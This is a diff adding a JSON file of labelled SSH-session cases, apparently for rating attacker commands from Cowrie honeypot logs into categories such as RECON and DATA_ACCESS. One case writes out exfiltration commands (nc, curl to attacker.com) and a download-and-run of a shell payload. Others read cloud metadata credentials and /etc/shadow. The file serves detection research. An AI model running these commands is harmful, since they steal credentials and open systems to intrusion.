@@ -1,0 +1,426 @@
+[
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "OTHER_ATTACK",
+    "RATER_C": "EXPLOITATION",
+    "case_id": "15ea0b50bab8",
+    "evidence": "tar czf - /home/ | nc 10.0.0.100 4444\nbase64 /etc/shadow | curl -d @- http://attacker.com/exfil\nwget http://attacker.com/shell.elf -O /tmp/s\nchmod +x /tmp/s && /tmp/s",
+    "neutral_context": "Historical controlled Cowrie SSH session. Login: login attempt [test/] succeeded. Session connect: yes."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "8eedbda67c5e",
+    "evidence": "Can you verify the integrity of the passwd and shadow files using md5sum?",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "BENIGN",
+    "case_id": "f59b0f83deb8",
+    "evidence": "Cached domain creds T1003.005 access without DCSync",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "PERSISTENCE",
+    "RATER_B": "PERSISTENCE",
+    "RATER_C": "BENIGN",
+    "case_id": "d29bc47aaf8d",
+    "evidence": "Create local account T1136.001 persistence on Windows",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "a2ae90e941c2",
+    "evidence": "Show audit log entries for privilege escalation attempts last week",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "RECON",
+    "RATER_B": "SUSPICIOUS",
+    "RATER_C": "RECON",
+    "case_id": "f7adb369b05b",
+    "evidence": "whoami\nid\nuname -a\ncat /etc/passwd\nls -la /tmp\nps aux",
+    "neutral_context": "Historical controlled Cowrie SSH session. Login: login attempt [admin/] succeeded. Session connect: yes."
+  },
+  {
+    "RATER_A": "EXPLOITATION",
+    "RATER_B": "EXPLOITATION",
+    "RATER_C": "BENIGN",
+    "case_id": "6774040df6ec",
+    "evidence": "Compromise software supply chain T1195 build system",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "EXPLOITATION",
+    "RATER_B": "EXPLOITATION",
+    "RATER_C": "BENIGN",
+    "case_id": "626a7058afca",
+    "evidence": "Execute malicious macro T1204.002 user execution",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "PRIVILEGE_ESCALATION",
+    "RATER_B": "EXPLOITATION",
+    "RATER_C": "BENIGN",
+    "case_id": "0254494cba63",
+    "evidence": "Forge Kerberos TGT T1558 golden ticket attack",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "BENIGN",
+    "case_id": "61461aff6d15",
+    "evidence": "grep -i error /var/log/syslog | tail -n 3",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "81ab39f29fd8",
+    "evidence": "Show all running Docker containers with resource limits",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "UNCERTAIN",
+    "RATER_B": "UNCERTAIN",
+    "RATER_C": "BENIGN",
+    "case_id": "1a14f74a5c9d",
+    "evidence": "final_evidence_ping",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "RECON",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "DATA_ACCESS",
+    "case_id": "34b1a0ff8c60",
+    "evidence": "curl http://169.254.169.254/latest/meta-data/\nwget http://169.254.169.254/latest/user-data\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "neutral_context": "Historical controlled Cowrie SSH session. Login: login attempt [root/test] succeeded. Session connect: yes."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "e95c877221d8",
+    "evidence": "What is the current load average compared to baseline?",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "RECON",
+    "RATER_B": "SUSPICIOUS",
+    "RATER_C": "RECON",
+    "case_id": "067a9a338d57",
+    "evidence": "ifconfig\nip a\nnetstat -an\nss -tulnp\nnmap -sV 10.0.0.0/24",
+    "neutral_context": "Historical controlled Cowrie SSH session. Login: login attempt [admin/admin] succeeded. Session connect: yes."
+  },
+  {
+    "RATER_A": "PERSISTENCE",
+    "RATER_B": "PERSISTENCE",
+    "RATER_C": "BENIGN",
+    "case_id": "d8e6781207e6",
+    "evidence": "Persistence registry Run Keys T1547.001 Windows startup",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "UNCERTAIN",
+    "RATER_B": "BENIGN",
+    "RATER_C": "SUSPICIOUS",
+    "case_id": "95014d960ed7",
+    "evidence": "asdfjqyz\nasdfjqyz",
+    "neutral_context": "Existing SSH session transcript file with 5 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "BENIGN",
+    "case_id": "d37e66a52394",
+    "evidence": "sysadmin@srv-01:~$ ss -tupln\nNetid State  Recv-Q Send-Q              Local Address:Port  Peer Address:PortProcess\nudp   UNCONN 0      0                      10.0.0.1:53         10.0.0.1:*\nudp   UNCONN 0      0                   10.0.0.1%lo:53         10.0.0.1:*\nudp   UNCONN 0      0                         10.0.0.1:5353       10.0.0.1:*\nudp   UNCONN 0      0                         10.0.0.1:5353       10.0.0.1:*\nudp   UNCONN 0      0                            [::]:5353          [::]:*\ntcp   LISTEN 0      4096                10.0.0.1%lo:53         10.0.0.1:*\ntcp   LISTEN 0      4096                    10.0.0.1:631        10.0.0.1:*\ntcp   LISTEN 0      4096                   10.0.0.1:53         10.0.0.1:*\ntcp   LISTEN 0      200                     10.0.0.1:5432       10.0.0.1:*\ntcp   LISTEN 0      4096                      10.0.0.1:22         10.0.0.1:*\ntcp   LISTEN 0      511                       10.0.0.1:80         10.0.0.1:*\ntcp   LISTEN 0      4096                        [::1]:631           [::]:*\ntcp   LISTEN 0      4096                         [::]:22            [::]:*\ntcp   LISTEN 0      200                         [::1]:5432          [::]:*",
+    "neutral_context": "Real Linux administration-style transcript (sysadmin@srv-01)."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "BENIGN",
+    "case_id": "0ac449be3c00",
+    "evidence": "systemctl --no-pager status sshd --lines=20",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "BENIGN",
+    "case_id": "21f3fba95561",
+    "evidence": "Steal web session cookie T1539 via network sniffing",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "SUSPICIOUS",
+    "RATER_C": "BENIGN",
+    "case_id": "486558eaf993",
+    "evidence": "sysadmin@srv-01:~$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nmessagebus:x:101:101::/nonexistent:/usr/sbin/nologin\nsyslog:x:102:102::/nonexistent:/usr/sbin/nologin\nsystemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin\nuuidd:x:103:103::/run/uuidd:/usr/sbin/nologin\ntss:x:105:105:TPM software stack,,,:/var/lib/tpm:/bin/false\ntcpdump:x:109:112::/nonexistent:/usr/sbin/nologin\nsysadmin:x:1000:1000:sysadmin,,,:/home/sysadmin:/bin/bash\nsshd:x:127:65534::/run/sshd:/usr/sbin/nologin\nsysadmin@srv-01:~$ cat /etc/shadow\ncat: /etc/shadow: Permission denied",
+    "neutral_context": "Real Linux administration-style transcript (sysadmin@srv-01)."
+  },
+  {
+    "RATER_A": "OTHER_ATTACK",
+    "RATER_B": "OTHER_ATTACK",
+    "RATER_C": "BENIGN",
+    "case_id": "4c023e3b99e3",
+    "evidence": "Disable Defender registry T1562.001 defense evasion",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "f36457810279",
+    "evidence": "How do I generate a packet capture for the last 5 minutes on interface eth0?",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "BENIGN",
+    "case_id": "8338479d937e",
+    "evidence": "Steal session cookie T1539.001 via network sniffing",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "a3a73cdfafdf",
+    "evidence": "Can you check the /var/log/auth.log for failed SSH login attempts from external IPs?",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "PERSISTENCE",
+    "RATER_B": "PERSISTENCE",
+    "RATER_C": "BENIGN",
+    "case_id": "d5df66c72999",
+    "evidence": "Modify system process via service creation T1543.001",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "PRIVILEGE_ESCALATION",
+    "RATER_B": "PRIVILEGE_ESCALATION",
+    "RATER_C": "BENIGN",
+    "case_id": "09806cbce3f0",
+    "evidence": "Use T1068 Exploitation Privilege Escalation bypass",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "SUSPICIOUS",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "c9624f2c1b63",
+    "evidence": "Has the root password been changed in the last 30 days? Check /etc/shadow",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "418625b2955f",
+    "evidence": "Show me the auditd rules currently configured on this system",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "RECON",
+    "RATER_B": "SUSPICIOUS",
+    "RATER_C": "RECON",
+    "case_id": "ef22a79a449b",
+    "evidence": "whoami\nid\nuname -a\ncat /etc/passwd\nls -la /tmp\nps aux",
+    "neutral_context": "Historical controlled Cowrie SSH session. Login: login attempt [root/admin] succeeded. Session connect: yes."
+  },
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "PRIVILEGE_ESCALATION",
+    "case_id": "d343b0dea63a",
+    "evidence": "sudo -n cat /etc/shadow\nsudo -n cat /etc/shadow",
+    "neutral_context": "Existing SSH session transcript file with 9 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "OTHER_ATTACK",
+    "RATER_B": "OTHER_ATTACK",
+    "RATER_C": "BENIGN",
+    "case_id": "ca3b19fdec5f",
+    "evidence": "Disable Windows Defender T1562.001 defense evasion",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "EXPLOITATION",
+    "RATER_B": "EXPLOITATION",
+    "RATER_C": "BENIGN",
+    "case_id": "87fcbea2f19f",
+    "evidence": "Compile HTML file T1204.001 client-side execution",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "EXPLOITATION",
+    "RATER_B": "EXPLOITATION",
+    "RATER_C": "BENIGN",
+    "case_id": "1e3542efa48d",
+    "evidence": "Use RDP execution T1021.001 for remote command execution",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "OTHER_ATTACK",
+    "RATER_B": "OTHER_ATTACK",
+    "RATER_C": "BENIGN",
+    "case_id": "05a1ae3f2171",
+    "evidence": "Hide artifact NTFS ADS T1564.004 alternate data stream",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "BENIGN",
+    "case_id": "525f8145ffc0",
+    "evidence": "Harvest browser credentials T1539 stealing session data",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "BENIGN",
+    "case_id": "fc7aa2474ac1",
+    "evidence": "Extract LSA secrets T1003.004 registry credential access",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "OTHER_ATTACK",
+    "RATER_B": "OTHER_ATTACK",
+    "RATER_C": "BENIGN",
+    "case_id": "fbbac19d306c",
+    "evidence": "Hide data in NTFS ADS T1564 alternate data stream",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "RECON",
+    "RATER_B": "RECON",
+    "RATER_C": "BENIGN",
+    "case_id": "a3979f9a523d",
+    "evidence": "Find system owner T1080 discovery information",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "BENIGN",
+    "case_id": "3416a7813bcc",
+    "evidence": "whoami\nexit",
+    "neutral_context": "Existing SSH session transcript file with 2 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "f1cb3f60a10b",
+    "evidence": "Show me the nginx access log filtered for 5xx error codes in the last hour",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "BENIGN",
+    "RATER_B": "RECON",
+    "RATER_C": "BENIGN",
+    "case_id": "b500c783da56",
+    "evidence": "sysadmin@srv-01:~$ whoami\nsysadmin\nsysadmin@srv-01:~$ id\nuid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),982(docker),995(input)\nsysadmin@srv-01:~$ uname -a\nLinux srv-01 7.0.0-34-generic #34~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep  4 15:38:29 UTC 2 x86_64 x86_64 x86_64 GNU/Linux",
+    "neutral_context": "Real Linux administration-style transcript (sysadmin@srv-01)."
+  },
+  {
+    "RATER_A": "PRIVILEGE_ESCALATION",
+    "RATER_B": "PRIVILEGE_ESCALATION",
+    "RATER_C": "BENIGN",
+    "case_id": "34b59a124d17",
+    "evidence": "Bypass UAC via T1548.003 for privilege escalation",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "OTHER_ATTACK",
+    "RATER_B": "OTHER_ATTACK",
+    "RATER_C": "BENIGN",
+    "case_id": "ec9a5d695a57",
+    "evidence": "Obfuscate via software packing T1027.002 defense evasion",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "DATA_ACCESS",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "BENIGN",
+    "case_id": "d16090fb5b54",
+    "evidence": "Extract credentials from password manager T1555",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "UNCERTAIN",
+    "RATER_B": "BENIGN",
+    "RATER_C": "SUSPICIOUS",
+    "case_id": "625478619bc6",
+    "evidence": "asdfjqyz\nasdfjqyz",
+    "neutral_context": "Existing SSH session transcript file with 6 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "PRIVILEGE_ESCALATION",
+    "RATER_B": "PRIVILEGE_ESCALATION",
+    "RATER_C": "BENIGN",
+    "case_id": "7b1ea515e04e",
+    "evidence": "Elevate privilege T1548.001 Elevated Execution with Prompt",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "PERSISTENCE",
+    "RATER_B": "PERSISTENCE",
+    "RATER_C": "BENIGN",
+    "case_id": "412f03deae88",
+    "evidence": "Create domain account T1136.002 AD persistence",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "RECON",
+    "RATER_B": "DATA_ACCESS",
+    "RATER_C": "DATA_ACCESS",
+    "case_id": "40c997fda3a2",
+    "evidence": "curl http://169.254.169.254/latest/meta-data/",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "EXPLOITATION",
+    "RATER_B": "EXPLOITATION",
+    "RATER_C": "BENIGN",
+    "case_id": "f77ef4c6cda9",
+    "evidence": "Target managed service provider T1199 initial access",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "SUSPICIOUS",
+    "RATER_B": "RECON",
+    "RATER_C": "RECON",
+    "case_id": "f6e36d49f053",
+    "evidence": "I need to find all files modified in the last 24 hours on this system",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "PERSISTENCE",
+    "RATER_B": "PERSISTENCE",
+    "RATER_C": "BENIGN",
+    "case_id": "ed67d2d0823d",
+    "evidence": "WMI persistence T1546 event subscription endpoint",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  },
+  {
+    "RATER_A": "OTHER_ATTACK",
+    "RATER_B": "OTHER_ATTACK",
+    "RATER_C": "BENIGN",
+    "case_id": "ebbbde247535",
+    "evidence": "Modify security tool T1562.002 disable MpEngine",
+    "neutral_context": "Existing SSH session transcript file with 1 attacker command(s). No model outputs or labels included in evidence."
+  }
+]
